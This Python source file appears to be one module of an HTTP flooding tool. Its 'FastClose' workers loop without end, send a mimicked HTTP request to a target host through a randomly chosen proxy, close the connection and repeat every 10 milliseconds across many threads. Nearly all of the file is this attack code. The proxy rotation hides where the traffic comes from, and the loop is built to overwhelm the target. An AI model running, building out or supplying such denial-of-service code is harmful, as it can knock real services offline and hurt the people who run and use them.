import time

import logger
from utils.async_utils import create_async_task
from utils.httpmimic import HTTPMimic
from utils.proxy_parser import get_random_proxy
from utils.socket_utils import create_tcp, parse_target

def run_fast_close(target, method: str, worker_id: int):
    job_id = 0
    pad_worker_id = str(worker_id).rjust(2, "0")
    
    host = target["host"]
    port = target["port"]
    path = target["path"]
    raw_target = f"{host}:{port}"
    
    while True:
        prefix = f"[Worker-{pad_worker_id} | Job-{job_id}]  "
        random_proxy = get_random_proxy()
        logger.info(f"{prefix} Sending <lmagenta>FastClose<reset> request <lcyan>(proxy={random_proxy}) <reset>to <lgreen>{raw_target}")   
        
        try:
            socket = create_tcp(raw_target, random_proxy)
            client = HTTPMimic(socket, False)
            client.send_version(method, path)
            client.send_headers(host)
            client.flush()
            client.end()
        except Exception as e:
            logger.err(f"{prefix} <lred>Error: {e}<reset>")
        
        time.sleep(0.01)
        job_id += 1 

def async_run_fast_close(threads: int, raw_target: str, method: str):   
    target = parse_target(raw_target)
    create_async_task(threads, run_fast_close, (target, method))